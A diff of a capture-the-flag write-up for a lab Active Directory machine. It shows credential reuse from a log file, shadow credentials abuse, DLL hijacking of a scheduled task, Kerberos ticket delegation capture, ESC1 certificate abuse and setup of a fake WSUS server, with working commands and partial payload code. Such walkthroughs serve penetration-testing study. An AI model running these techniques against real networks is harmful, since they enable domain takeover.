@@ -60,20 +60,20 @@ SMB   10.129.22.14  445  DC01  NETLOGON   READ         Logon server share
 SMB   10.129.22.14  445  DC01  SYSVOL     READ         Logon server share
 :::
 
-The {warn:Logs} share stands out as non-default. Listing its contents reveals several log files, with `IdentitySync_Trace_20260219.log` being the interesting one.
+The non-default {warn:Logs} share contains several files, including `IdentitySync_Trace_20260219.log`.
 
 ::: terminal title="shell · operator@kali" lang="bash"
 $ netexec smb 10.129.22.14 -u wallace.everette -p 'Welcome2026@' --share Logs --dir .
 :::
 
-Downloading and reading through the identity sync trace, a bind credential sits in plaintext:
+Download the identity sync trace. It contains a plaintext bind credential:
 
 ::: terminal title="IdentitySync_Trace_20260219.log" lang="bash"
 BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025"
 :::
 
 ::: note title="YEAR BUMP"
-The log is dated 2026 but the password ends in `2025`. This is a ==yearly password rotation pattern== -- bump the year to `2026` and the credential is live.
+The log is dated 2026 but the password ends in `2025`. The ==yearly password rotation pattern== suggests changing the year to `2026`. That credential works.
 :::
 
 ::: terminal title="shell · operator@kali" lang="bash"
@@ -100,7 +100,7 @@ $ bloodyAD -d logging.htb -k ccache=svc_recovery.ccache \
   get writable --otype computer --detail
 :::
 
-{red:svc_recovery} has write access to the {warn:msDS-KeyCredentialLink} attribute on the {red:msa_health$} managed service account. This is a textbook shadow credentials attack -- we add our own key pair and authenticate as the account.
+{red:svc_recovery} has write access to the {warn:msDS-KeyCredentialLink} attribute on the {red:msa_health$} managed service account. Add a key pair using shadow credentials, then authenticate as the account.
 
 ::: terminal title="shell · operator@kali · shadow creds" lang="bash"
 $ bloodyAD -d logging.htb -k ccache=svc_recovery.ccache \
@@ -121,17 +121,17 @@ WINRM  10.129.22.14  5985  DC01  [+] logging.htb\msa_health$:603fc24ee01a9409f83
 
 ::: stage n=3 label="USER" title="A scheduled task, a zip file, and the loader lock that almost ruined everything."
 
-Poking around the system reveals a scheduled task called {warn:UpdateChecker Agent} that runs every 3 minutes as {red:LOGGING\jaylee.clifton}. The task executes `C:\Program Files\UpdateMonitor\UpdateMonitor.exe`.
+The system has a scheduled task called {warn:UpdateChecker Agent} that runs every 3 minutes as {red:LOGGING\jaylee.clifton}. The task executes `C:\Program Files\UpdateMonitor\UpdateMonitor.exe`.
 
 The binary reads a zip from `C:\ProgramData\UpdateMonitor\Settings_Update.zip`, extracts `settings_update.dll` to the `bin\` directory, and loads it via `LoadLibrary`. It also calls a `PreUpdateCheck` export from the DLL if it exists.
 
-The key: {red:msa_health$} has ==write access== to `C:\ProgramData\UpdateMonitor\`, so we can drop our own zip containing a malicious DLL.
+{red:msa_health$} has ==write access== to `C:\ProgramData\UpdateMonitor\`, so we can drop our own zip containing a malicious DLL.
 
 ::: warn title="LOADER LOCK GOTCHA"
 You cannot use a standard msfvenom DLL payload here. Both `windows/shell_reverse_tcp` and `windows/exec` will deadlock in `DllMain` due to the Windows loader lock. Any socket operations or complex process creation from `DllMain` will hang `UpdateMonitor.exe`, locking the DLL on disk and preventing future extractions.
 :::
 
-The solution is a custom DLL with `mingw` that spawns a child process and returns from `DllMain` immediately:
+Build a custom DLL with `mingw` that spawns a child process and returns from `DllMain` immediately:
 
 ::: terminal title="dllpayload.c" lang="c"
 #include <windows.h>
@@ -154,7 +154,7 @@ __declspec(dllexport) void PreUpdateCheck(void) { }
 :::
 
 ::: tip
-The `PreUpdateCheck` export is required -- `UpdateMonitor.exe` looks for it after loading the DLL. Without it, the binary logs an error and the task fails silently. The `Sleep(500)` gives the child process time to spawn before the parent exits.
+The `PreUpdateCheck` export is required: `UpdateMonitor.exe` looks for it after loading the DLL. Without it, the binary logs an error and the task fails silently. The `Sleep(500)` gives the child process time to spawn before the parent exits.
 :::
 
 Compile, zip, and drop:
@@ -177,7 +177,7 @@ user=jaylee.clifton host=DC01 exe=True
 :::
 
 ::: opsec
-The `tgtdeleg` trick via Rubeus is critical here -- it captures the delegated TGT for {red:jaylee.clifton} from the scheduled task context. We need this Kerberos ticket for the AD CS enrollment in the next stage.
+Rubeus `tgtdeleg` captures the delegated TGT for {red:jaylee.clifton} from the scheduled task context. We need this Kerberos ticket for the AD CS enrollment in the next stage.
 :::
 
 **User Flag:** `81a3d868fa0aba6cd2b742152127500b`
@@ -193,7 +193,7 @@ $ certipy find -u wallace.everette@logging.htb -p 'Welcome2026@' \
   -dc-ip 10.129.22.14 -enabled -stdout
 :::
 
-A template called {warn:UpdateSrv} is enrollable by the `IT` group. It has ==Enrollee Supplies Subject== enabled and the {warn:Server Authentication} EKU -- a classic {red:ESC1} misconfiguration. We can request a certificate for any DNS name.
+A template called {warn:UpdateSrv} is enrollable by the `IT` group. It has ==Enrollee Supplies Subject== enabled and the {warn:Server Authentication} EKU, a {red:ESC1} misconfiguration. We can request a certificate for any DNS name.
 
 Using jaylee's delegated TGT, we request a certificate with the SAN `wsus.logging.htb`:
 
@@ -211,14 +211,14 @@ $ openssl pkcs12 -in loot/wsus/wsus.pfx -nodes -out loot/wsus/wsus.pem -passin p
 :::
 
 ::: note title="WHY ESC1 MATTERS"
-Enrollee Supplies Subject means the requester controls the Subject Alternative Name. Combined with Server Authentication EKU, this lets us mint a TLS certificate that Windows Update will trust for any hostname in the domain -- including `wsus.logging.htb`.
+Enrollee Supplies Subject means the requester controls the Subject Alternative Name. Combined with Server Authentication EKU, this lets us mint a TLS certificate that Windows Update will trust for any hostname in the domain, including `wsus.logging.htb`.
 :::
 
 :::
 
 ::: stage n=5 label="SYSTEM" title="DNS poisoning, a fake WSUS, and a KB update that runs PsExec."
 
-Checking the registry on DC01 reveals WSUS is configured to point to `https://wsus.logging.htb:8531`. This hostname doesn't resolve yet -- so we create the DNS record ourselves.
+Checking the registry on DC01 reveals WSUS is configured to point to `https://wsus.logging.htb:8531`. This hostname does not resolve yet, so create the DNS record.
 
 ::: terminal title="shell · operator@kali · bloodyAD" lang="bash"
 $ bloodyAD -d logging.htb -u wallace.everette -p 'Welcome2026@' \
